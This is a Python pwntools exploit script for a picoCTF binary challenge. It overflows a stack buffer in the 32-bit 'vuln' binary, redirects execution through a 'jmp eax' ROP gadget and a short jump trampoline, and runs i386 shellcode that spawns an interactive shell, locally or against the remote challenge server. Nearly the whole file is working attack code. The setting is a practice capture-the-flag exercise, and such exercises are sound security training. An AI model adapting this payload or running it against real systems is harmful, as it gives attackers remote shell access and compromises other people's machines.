#!/user/bin/env python3

from pwn import *

NAME = 'chall/vuln'
PORT = 52238
URL = 'saturn.picoctf.net'
FLAGFILE = 'chall/flag.txt'

# Configuration settings for the script to launch GDB in the container
TERMINAL_CONFIG = ['tmux', 'split-window', '-h', '-F', '#{pane_pid}', '-P']

GDB_COMMAND = f'''
break vuln
break *0x08049dc0
continue
'''
ENV = {}

context.binary = ELF(NAME)
context.terminal = TERMINAL_CONFIG

def create_flag(flag_path):
    write(flag_path, 'THIS_IS_THE_FLAG' * 4 + '\n')

# Create target process or connect to remote
if args['REMOTE']:
    log.warning('This challenge requires that you start the remote instance.\n'
                'Ensure that the domain and port used in this script with '
                'the remote instance')
    p = remote(URL, PORT)
elif args['GDB']:
    create_flag(FLAGFILE)
    p = gdb.debug(context.binary.path, gdbscript=GDB_COMMAND, env=ENV)
else:
    create_flag(FLAGFILE)
    p = process(context.binary.path, env=ENV)

# 7 32-bit words are on the stack between the start of the overflow buffer and
# the saved return address
OVERFLOW_OFFSET = 7 * 4

# At the time that the ROP chain begins execution:
# eax = beginning of shellcode buffer
# Just jump to the shellcode and win

# Gadgets found in gadgets.txt: `ROPgadget --binary vuln > gadgets.txt`
# `grep -E "jmp [a-z]{3}\$" gadgets.txt`
GADGET_JMP_EAX = 0x0805333b

trampoline_text = f"jmp $+0x{(OVERFLOW_OFFSET + 4):02x}"
trampoline = asm(trampoline_text)
assert(len(trampoline) < OVERFLOW_OFFSET)

shellcode_text = shellcraft.i386.linux.sh()
shellcode = asm(shellcode_text)

PADDING = b'A' * (OVERFLOW_OFFSET - len(trampoline))
RETADDR = p32(GADGET_JMP_EAX)
PAYLOAD = trampoline + PADDING + RETADDR + shellcode

assert(b'\n' not in PAYLOAD)

p.recvline()
p.sendline(PAYLOAD)
p.interactive()
